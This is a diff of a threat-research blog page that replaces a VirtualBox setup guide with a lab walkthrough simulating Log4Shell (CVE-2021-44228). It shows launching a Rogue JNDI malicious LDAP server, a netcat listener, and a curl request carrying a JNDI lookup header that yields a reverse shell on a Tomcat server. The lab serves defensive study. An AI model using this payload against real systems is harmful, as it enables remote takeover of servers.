@@ -11,7 +11,7 @@
 
 
 
-    <title>VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine</title>
+    <title>CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI</title>
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <!-- Styles'n'Scripts -->
@@ -36,30 +36,30 @@
     <!-- This tag outputs SEO meta+structured data and other important settings -->
     <meta name="description" content="Sharing and collaborating to empower the Infosec community!" />
     <link rel="shortcut icon" href="https://blog.openthreatresearch.com/assets/images/favicon.png" type="image/png" />
-    <link rel="canonical" href="https://blog.openthreatresearch.com/virtualbox_ubuntu_desktop" />
+    <link rel="canonical" href="https://blog.openthreatresearch.com/simulating_cve_2021_44228" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
 
      <!--title below is coming from _includes/dynamic_title-->
     <meta property="og:site_name" content="Open Threat Research Blog" />
     <meta property="og:type" content="website" />
-    <meta property="og:title" content="VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine" />
-    <meta property="og:description" content="In this blog post, we will share the steps that you can follow to create an Ubuntu Desktop virtual machine in VirtualBox (Version 6.1.30). We are using the name attacker for this virtual machine, but you can use your preferred name. Also, for the network adapter, we are using the" />
-    <meta property="og:url" content="https://blog.openthreatresearch.com/virtualbox_ubuntu_desktop" />
-    <meta property="og:image" content="https://blog.openthreatresearch.com/assets/images/blog/virtualbox_ubuntu_desktop_server/attacker_ubuntu_machine.png" />
+    <meta property="og:title" content="CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI" />
+    <meta property="og:description" content="In this blog post, we will share the steps that you can follow to simulate the use of CVE-2021-44228 to exploit Log4j vulnerabilities using Rogue JNDI (Malicious LDAP Server). We will follow the steps provided within the log4jshell-lab GitHub repository by Roberto Rodriguez Pre-Requisites For the purpose of this blog," />
+    <meta property="og:url" content="https://blog.openthreatresearch.com/simulating_cve_2021_44228" />
+    <meta property="og:image" content="https://blog.openthreatresearch.com/assets/images/blog/log4jshell_simulation/attacker_control_of_tomcat.png" />
     <meta property="article:publisher" content="https://www.facebook.com/" />
     <meta property="article:author" content="https://www.facebook.com/" />
-    <meta property="article:published_time" content="2022-01-10T07:00:00-05:00" />
-    <meta property="article:modified_time" content="2022-01-10T07:00:00-05:00" />
-    <meta property="article:tag" content="Virtualbox" />
+    <meta property="article:published_time" content="2022-01-11T20:00:00-05:00" />
+    <meta property="article:modified_time" content="2022-01-11T20:00:00-05:00" />
+    <meta property="article:tag" content="Log4jshell" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine" />
-    <meta name="twitter:description" content="In this blog post, we will share the steps that you can follow to create an Ubuntu Desktop virtual machine in VirtualBox (Version 6.1.30). We are using the name attacker for this virtual machine, but you can use your preferred name. Also, for the network adapter, we are using the" />
+    <meta name="twitter:title" content="CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI" />
+    <meta name="twitter:description" content="In this blog post, we will share the steps that you can follow to simulate the use of CVE-2021-44228 to exploit Log4j vulnerabilities using Rogue JNDI (Malicious LDAP Server). We will follow the steps provided within the log4jshell-lab GitHub repository by Roberto Rodriguez Pre-Requisites For the purpose of this blog," />
     <meta name="twitter:url" content="https://blog.openthreatresearch.com/" />
-    <meta name="twitter:image" content="https://blog.openthreatresearch.com/assets/images/blog/virtualbox_ubuntu_desktop_server/attacker_ubuntu_machine.png" />
+    <meta name="twitter:image" content="https://blog.openthreatresearch.com/assets/images/blog/log4jshell_simulation/attacker_control_of_tomcat.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Open Threat Research Blog" />
     <meta name="twitter:label2" content="Filed under" />
-    <meta name="twitter:data2" content="Virtualbox" />
+    <meta name="twitter:data2" content="Log4jshell" />
     <meta name="twitter:site" content="@OTR_Community" />
     <meta name="twitter:creator" content="@OTR_Community" />
     <meta property="og:image:width" content="1400" />
@@ -74,18 +74,18 @@
         "name": "Open Threat Research Blog",
         "logo": "https://blog.openthreatresearch.com/false"
     },
-    "url": "https://blog.openthreatresearch.com/virtualbox_ubuntu_desktop",
+    "url": "https://blog.openthreatresearch.com/simulating_cve_2021_44228",
     "image": {
         "@type": "ImageObject",
-        "url": "https://blog.openthreatresearch.com/assets/images/blog/virtualbox_ubuntu_desktop_server/attacker_ubuntu_machine.png",
+        "url": "https://blog.openthreatresearch.com/assets/images/blog/log4jshell_simulation/attacker_control_of_tomcat.png",
         "width": 2000,
         "height": 666
     },
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://blog.openthreatresearch.com/virtualbox_ubuntu_desktop"
+        "@id": "https://blog.openthreatresearch.com/simulating_cve_2021_44228"
     },
-    "description": "In this blog post, we will share the steps that you can follow to create an Ubuntu Desktop virtual machine in VirtualBox (Version 6.1.30). We are using the name attacker for this virtual machine, but you can use your preferred name. Also, for the network adapter, we are using the"
+    "description": "In this blog post, we will share the steps that you can follow to simulate the use of CVE-2021-44228 to exploit Log4j vulnerabilities using Rogue JNDI (Malicious LDAP Server). We will follow the steps provided within the log4jshell-lab GitHub repository by Roberto Rodriguez Pre-Requisites For the purpose of this blog,"
 }
     </script>
 
@@ -98,7 +98,7 @@
     </script> -->
 
     <meta name="generator" content="Jekyll 3.6.2" />
-    <link rel="alternate" type="application/rss+xml" title="VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine" href="/feed.xml" />
+    <link rel="alternate" type="application/rss+xml" title="CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI" href="/feed.xml" />
 
 
 </head>
@@ -153,148 +153,134 @@ into the {body} of the default.hbs template -->
 <main id="site-main" class="site-main outer" role="main">
     <div class="inner">
 
-        <article class="post-full  tag-virtualbox tag-ubuntu post ">
+        <article class="post-full  tag-log4jshell post ">
 
             <header class="post-full-header">
                 <section class="post-full-meta">
-                    <time class="post-full-meta-date" datetime="10 January 2022">10 January 2022</time>
+                    <time class="post-full-meta-date" datetime="11 January 2022">11 January 2022</time>
                     
                         <span class="date-divider">/</span>
                         
                             
-                               <a href='/tag/virtualbox/'>VIRTUALBOX</a>,
-                            
-                        
-                            
-                               <a href='/tag/ubuntu/'>UBUNTU</a>
+                               <a href='/tag/log4jshell/'>LOG4JSHELL</a>
                             
                         
                     
                 </section>
-                <h1 class="post-full-title">VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine</h1>
+                <h1 class="post-full-title">CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI</h1>
             </header>
 
             
-            <figure class="post-full-image" style="background-image: url(/assets/images/blog/virtualbox_ubuntu_desktop_server/attacker_ubuntu_machine.png)">
+            <figure class="post-full-image" style="background-image: url(/assets/images/blog/log4jshell_simulation/attacker_control_of_tomcat.png)">
             </figure>
             
 
             <section class="post-full-content">
                 <div class="kg-card-markdown">
-                    <p>In this blog post, we will share the steps that you can follow to create an Ubuntu Desktop virtual machine in VirtualBox (Version 6.1.30). We are using the name <strong>attacker</strong> for this virtual machine, but you can use your preferred name. Also, for the network adapter, we are using the name <strong>Log4Shell</strong>, but you can use your preferred name.</p>
+                    <p>In this blog post, we will share the steps that you can follow to simulate the use of <strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a></strong> to exploit <strong>Log4j</strong> vulnerabilities using <strong>Rogue JNDI</strong> (Malicious LDAP Server). We will follow the steps provided within the <a href="https://github.com/Cyb3rWard0g/log4jshell-lab">log4jshell-lab</a> GitHub repository by <a href="https://twitter.com/Cyb3rWard0g">Roberto Rodriguez</a></p>
 
-<h1 id="downloading-iso-files">Downloading ISO Files</h1>
+<h1 id="pre-requisites">Pre-Requisites</h1>
 
-<h2 id="ubuntu-20043-lts---desktop-attacker">Ubuntu 20.04.3 LTS - Desktop (Attacker)</h2>
+<p>For the purpose of this blog, we will assume that you have already deployed the required virtual machines using VirtualBox. You can review our previous blog posts to set up the virtual environment.</p>
 
-<p>Go to <a href="https://ubuntu.com/download/desktop">https://ubuntu.com/download/desktop</a> and download the ISO file by clicking in <strong>Download</strong>.</p>
+<ul>
+  <li>
+    <p><a href="https://blog.openthreatresearch.com/setting_up_attacker_victim_machines">CVE-2021-44228: Setting Up Virtual Machines for the Attacker and Victim</a></p>
+  </li>
+  <li>
+    <p><a href="https://blog.openthreatresearch.com/virtualbox_ubuntu_desktop">VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine</a></p>
+  </li>
+  <li>
+    <p><a href="https://blog.openthreatresearch.com/virtualbox_ubuntu_server">VirtualBox: Creating an Ubuntu Server 20.04.3 LTS Virtual Machine</a></p>
+  </li>
+</ul>
 
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/download_iso_ubuntu_desktop.png" alt="" /></p>
+<h1 id="tomcat-server-running-vulnerable-java-applications">Tomcat Server Running Vulnerable Java Applications</h1>
 
-<h1 id="creating-virtual-machine---virtualbox">Creating Virtual Machine - VirtualBox</h1>
+<p>We have deployed our Tomcat Server using an Ubuntu server 20.04.3 LTS virtual machine. This server is running different Java applications that are vulnerable to an attacker using the Log4j CVE-2021-44228 remote code exeution vulnerability.</p>
 
-<h2 id="nat-network-address-translation-network">NAT (Network Address Translation) Network</h2>
+<p>Let’s check the status of the tomcat service using the following commad:</p>
 
-<p>Go to <em>File &gt; Preferences &gt; Network</em> and create a NAT network adapter. We are naming it <strong>Log4Shell</strong> and using a CIDR <strong>192.168.50.0/24</strong>. Do not forget to check the <strong>Supports DHCP</strong> option.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/virtualbox_nat_network.png" alt="" /></p>
-
-<h2 id="ubuntu-desktop-virtual-machine">Ubuntu Desktop Virtual Machine</h2>
-
-<p>Go to <em>Machine &gt; New</em> and create a new virtual machine. We are naming it <strong>attacker</strong> and using type <strong>Linux</strong> and version <strong>Ubuntu (64-bit)</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker.png" alt="" /></p>
-
-<p>Select the preferred amount of memory (RAM). We will use <strong>4096 MB</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_ram.png" alt="" /></p>
-
-<p>Create a virtual hard disk using default options.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_virtual_hard_disk.png" alt="" /></p>
-
-<p>Select the attacker virtual machine and go to <em>Machine &gt; Settings</em>. Go to the <strong>Storage</strong> tab and select the <strong>Choose a Disk File</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_add_iso.png" alt="" /></p>
-
-<p>Choose the ISO file for Ubuntu Desktop you downloaded before.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_choose_iso.png" alt="" /></p>
-
-<p>Go to the <strong>Network</strong> tab and attach the <strong>Log4Shell</strong> network adapter you created before. Click on <strong>OK</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_network_adapter.png" alt="" /></p>
-
-<p>Select the attacker virtual machine and go to <em>Machine &gt; Start</em>. This will start the Ubuntu virtual machine.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_start_vm.png" alt="" /></p>
-
-<p>Select <strong>Install Ubuntu</strong> and continue the installation process using default options.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_install_ubuntu.png" alt="" /></p>
-
-<p>Use <strong>attacker</strong> as the name, computer’s name, and username. Also, you should choose and confirm your password.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_user_password.png" alt="" /></p>
-
-<p>Wait for the installation process to complete.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_wait_installation.png" alt="" /></p>
-
-<p>When the installation is complete, click on <strong>Restart Now</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_restart_now.png" alt="" /></p>
-
-<p>Press <strong>ENTER</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_press_enter.png" alt="" /></p>
-
-<p>Click on the user <strong>attacker</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_select_user.png" alt="" /></p>
-
-<p>Insert the user’s <strong>password</strong>.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_insert_password.png" alt="" /></p>
-
-<p>Awesome!! You have created the attacker’s virtual machine.</p>
-
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_vm_ready.png" alt="" /></p>
-
-<p>If necessary, you can add the following features to your new virtual machine:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Devices &gt; Shared Clipboard &gt; Bidirectional
-- Devices &gt; Drag and Drop &gt; Bidirectional
-- Devices &gt; Insert Guest Additions CD Image
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service tomcat status
 </code></pre></div></div>
 
-<h2 id="problems-when-installing-the-guest-additions-cd-image">Problems when Installing the Guest Additions CD Image?</h2>
+<p><img src="assets/images/blog/log4jshell_simulation/victim_checking_tomcat_service.png" alt="" /></p>
 
-<p>You might get the following error: <strong>This system is currently not set up to build kernel modules</strong></p>
+<h1 id="setting-up-the-rogue-jndi-server">Setting Up the Rogue JNDI Server</h1>
 
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_error_guest_additions.png" alt="" /></p>
+<p><strong>Rogue JNDI</strong> is a malicious <strong>LDAP server</strong> that provides a malicious <strong>Java class</strong> in response to the <strong>LDAP request</strong> from our <strong>tomcat server</strong> running a <strong>vulnerable version of Log4j</strong>. The Java class may contain, for example, malicious code that can start a <strong>reverse shell connection</strong> from our tomcat server. We will deploy a Rogue JNDI server in our attacker machine.</p>
 
-<p>Press <strong>enter</strong>, open a <strong>terminal</strong> window, and run the following commands:</p>
+<p>Using the <strong>cd</strong> command, change your current directory to <em>log4jshell-lab/attacker/rogue-jndi/</em></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt update
-sudo apt install build-essential
+<p>Using the <strong>docker build</strong> command, build the docker image for the Rogue JNDI server</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo su
+
+cd log4jshell-lab/attacker/rogue-jndi/
+
+docker build . -t rogue-jndi
 </code></pre></div></div>
 
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_install_build.png" alt="" /></p>
+<p><img src="assets/images/blog/log4jshell_simulation/attacker_building_docker_image.png" alt="" /></p>
 
-<p>Now, you can start the installation process again.</p>
+<p>Using the <strong>docker run</strong> command, start the Rogue JNDI server. Note that we are also defining the attacker IP address for the payload (192.168.50.4) and the ports that will be used by our server (1389 and 8888).</p>
 
-<h2 id="running-out-of-hard-disk-space">Running Out of Hard Disk Space?</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --rm -ti -e PAYLOAD_IP=192.168.50.4 -p 1389:1389 -p 8888:8888 rogue-jndi
+</code></pre></div></div>
 
-<p>First, <strong>power off</strong> your virtual machine. Then go to <em>File &gt; Virtual Media Manager</em> and select the <strong>Hard disks</strong> tab within the <strong>Properties</strong> section. Look for and select the Ubuntu Desktop’s virtual hard disk.</p>
+<p><img src="assets/images/blog/log4jshell_simulation/attacker_running_docker_image.png" alt="" /></p>
 
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_virtual_media_manager.png" alt="" /></p>
+<p>After starting the Rogue JNDI server, using a new <strong>terminal</strong> window in the same attacker machine, we will use the <strong>nc</strong> command to start a netcat listener to process the reverse shell connection.</p>
 
-<p>Update the <strong>size</strong> of the virtual hard doisk based on your requirements. Click on <strong>Apply</strong> and then click on <strong>Close</strong>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo su
 
-<p><img src="assets/images/blog/virtualbox_ubuntu_desktop_server/create_ubuntu_attacker_virtual_media_manager_update.png" alt="" /></p>
+nc -lvnp 443
+</code></pre></div></div>
 
-<p>You can now start your virtual machine again.</p>
+<p><img src="assets/images/blog/log4jshell_simulation/attacker_netcat_listener.png" alt="" /></p>
+
+<p>AWESOME!! We have deployed our <strong>Rogue JNDI</strong> LDAP server and our <strong>netcat</strong> listener. You should have two <strong>terminal</strong> windows like the ones showed in the image below.</p>
+
+<p><img src="assets/images/blog/log4jshell_simulation/attacker_rogue_jndi_netcat.png" alt="" /></p>
+
+<h1 id="exploiting-log4j-vulnerabilities">Exploiting Log4j vulnerabilities</h1>
+
+<p>When we were checking the availability of the Java applications in our Tomcat server, we needed to complete 2 steps:</p>
+
+<ul>
+  <li>
+    <p>Stablish a SSH connection to our Tomcat server using the user, IP address and password for our server.</p>
+  </li>
+  <li>
+    <p>Perform a <strong>GET</strong> request using the API for each application.</p>
+  </li>
+</ul>
+
+<p>However, since the attacker does not have the credentials for our Tomcat server, it cannot stablish a SSH connection. If we perform the GET request using the API for our application to the Tomcat server, we can see that the appication is available, but we do not have control over the Tomcat server. Note that we are using the IP address for our Tomcat server and not the local IP 127.0.0.1 .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET 192.168.50.5:8080/Log4j-2.14.0-SNAPSHOT/api
+</code></pre></div></div>
+
+<p><img src="assets/images/blog/log4jshell_simulation/attacker_attempt_get_request.png" alt="" /></p>
+
+<p>We will now add a header to our GET request. The header of our request will contain a LDAP request that points to our Rogue JNDI server (192.168.50.4:1389)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET -H 'user-agent: ${jndi:ldap://192.168.50.4:1389/o=tomcat}' 192.168.50.5:8080/Log4j-2.14.0-SNAPSHOT/api
+</code></pre></div></div>
+
+<p><img src="assets/images/blog/log4jshell_simulation/attacker_control_of_tomcat.png" alt="" /></p>
+
+<p>As you can see in the image above, after executing our GET request (With Header), we got a reverse shell connection from the Tomcat server to our attacker machine. We now have full control of the server!!</p>
+
+<h1 id="references">References</h1>
+<ul>
+  <li><strong>GitHub Repository</strong>: <a href="https://github.com/Cyb3rWard0g/log4jshell-lab">https://github.com/Cyb3rWard0g/log4jshell-lab</a></li>
+  <li><strong>Research Notes</strong>: <a href="https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/research-notes">https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/research-notes</a></li>
+  <li><strong>CVE-2021-44228 Simulation</strong>: <a href="https://github.com/Cyb3rWard0g/log4jshell-lab/blob/main/research-notes/2021-12-11_01-CVE-2021-44228-simulation.md">https://github.com/Cyb3rWard0g/log4jshell-lab/blob/main/research-notes/2021-12-11_01-CVE-2021-44228-simulation.md</a></li>
+  <li><strong>Attacker System</strong>: <a href="https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/attacker">https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/attacker</a></li>
+  <li><strong>Victim System</strong>: <a href="https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/victim">https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/victim</a></li>
+  <li><strong>YouTube video (Installing Rogue JNDI on Kali Linux)</strong>: <a href="https://youtu.be/F74Grm9PRYQ">https://youtu.be/F74Grm9PRYQ</a></li>
+</ul>
 
                 </div>
             </section>
@@ -371,13 +357,13 @@ sudo apt install build-essential
                     <article class="read-next-card"
                         
                             
-                                style="background-image: url(url(/assets/images/blog/virtualbox_ubuntu_desktop_server/attacker_ubuntu_machine.png)"
+                                style="background-image: url(url(/assets/images/blog/log4jshell_simulation/attacker_control_of_tomcat.png)"
                         
                     >
                         <header class="read-next-card-header">
                             <small class="read-next-card-header-sitetitle">&mdash; Open Threat Research Blog &mdash;</small>
                             
-                                <h3 class="read-next-card-header-title"><a href="/tag/virtualbox/">Virtualbox</a></h3>
+                                <h3 class="read-next-card-header-title"><a href="/tag/log4jshell/">Log4jshell</a></h3>
                             
                         </header>
                         <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
@@ -386,6 +372,8 @@ sudo apt install build-essential
                             <ul>
                                 
                                 
+                                  
+                                    
                                   
                                 
                                   
@@ -398,16 +386,7 @@ sudo apt install build-essential
                                   
                                 
                                   
-                                    
-                                        
-                                        
-                                            <li><a href="/virtualbox_ubuntu_server">VirtualBox: Creating an Ubuntu Server 20.04.3 LTS Virtual Machine</a></li>
-                                        
-                                    
-                                  
                                 
-                                  
-                                    
                                   
                                 
                                   
@@ -459,9 +438,9 @@ sudo apt install build-essential
                             </ul>
                         </div>
                         <footer class="read-next-card-footer">
-                            <a href="/tag/virtualbox/">
+                            <a href="/tag/log4jshell/">
                                 
-                                    See all 2 posts  →
+                                    See all 1 posts  →
                                 
                             </a>
                         </footer>
@@ -471,67 +450,6 @@ sudo apt install build-essential
 
             <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
             
-                
-
-    <article class="post-card post-template">
-        
-            <a class="post-card-image-link" href="/virtualbox_ubuntu_server">
-                <div class="post-card-image" style="background-image: url(/assets/images/blog/virtualbox_ubuntu_desktop_server/tomcat_ubuntu_machine.png)"></div>
-            </a>
-        
-        <div class="post-card-content">
-            <a class="post-card-content-link" href="/virtualbox_ubuntu_server">
-                <header class="post-card-header">
-                    
-                        
-                            
-                               <span class="post-card-tags">Virtualbox</span>
-                            
-                        
-                            
-                                <span class="post-card-tags">Ubuntu</span>
-                            
-                        
-                    
-
-                    <h2 class="post-card-title">VirtualBox: Creating an Ubuntu Server 20.04.3 LTS Virtual Machine</h2>
-                </header>
-                <section class="post-card-excerpt">
-                    
-                        <p></p>
-                    
-                </section>
-            </a>
-            <footer class="post-card-meta">
-                
-                    
-                
-                    
-                        
-                        <img class="author-profile-image" src="/assets/images/authors/avatar-jose.jpg" alt="Jose Rodriguez" />
-                        
-                        <span class="post-card-author">
-                            <a href="/author/jose/">Jose Rodriguez</a>
-                        </span>
-                    
-                
-                    
-                
-                    
-                
-                    
-                
-                <span class="reading-time">
-                    
-                    
-                      1 min read
-                    
-                </span>
-            </footer>
-        </div>
-    </article>
-
-            
 
             <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
             
@@ -539,22 +457,26 @@ sudo apt install build-essential
 
     <article class="post-card post-template">
         
-            <a class="post-card-image-link" href="/ossem_generation_xpath_queries">
-                <div class="post-card-image" style="background-image: url(/assets/images/blog/ossem_creating_xpath_queries/2021-06-22_00_blog_image.png)"></div>
+            <a class="post-card-image-link" href="/setting_up_attacker_victim_machines">
+                <div class="post-card-image" style="background-image: url(/assets/images/blog/log4shell_attacker_victim_machine/attacker_tomcat_virtual_machines.png)"></div>
             </a>
         
         <div class="post-card-content">
-            <a class="post-card-content-link" href="/ossem_generation_xpath_queries">
+            <a class="post-card-content-link" href="/setting_up_attacker_victim_machines">
                 <header class="post-card-header">
                     
                         
                             
-                                <span class="post-card-tags">Ossem</span>
+                               <span class="post-card-tags">Log4jshell</span>
+                            
+                        
+                            
+                                <span class="post-card-tags">Virtualbox</span>
                             
                         
                     
 
-                    <h2 class="post-card-title">OSSEM Detection Model: Leveraging Data Relationships to Generate Windows Event XPath Queries</h2>
+                    <h2 class="post-card-title">CVE-2021-44228: Setting Up Virtual Machines for the Attacker and Victim</h2>
                 </header>
                 <section class="post-card-excerpt">
                     
@@ -608,18 +530,18 @@ sudo apt install build-essential
         </a>
     </div>
     <span class="floating-header-divider">&mdash;</span>
-    <div class="floating-header-title">VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine</div>
+    <div class="floating-header-title">CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI</div>
     <div class="floating-header-share">
         <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
     <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
 </svg>
 </div>
-        <a class="floating-header-share-tw" href="https://twitter.com/share?text=VirtualBox%3A+Creating+an+Ubuntu+Desktop+20.04.3+LTS+Virtual+Machine&amp;url=virtualbox_ubuntu_desktop"
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=CVE-2021-44228%3A+Exploiting+Log4j+Vulnerabilities+using+Rogue+JNDI&amp;url=simulating_cve_2021_44228"
             onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
 
         </a>
-        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=virtualbox_ubuntu_desktop"
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=simulating_cve_2021_44228"
             onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
 
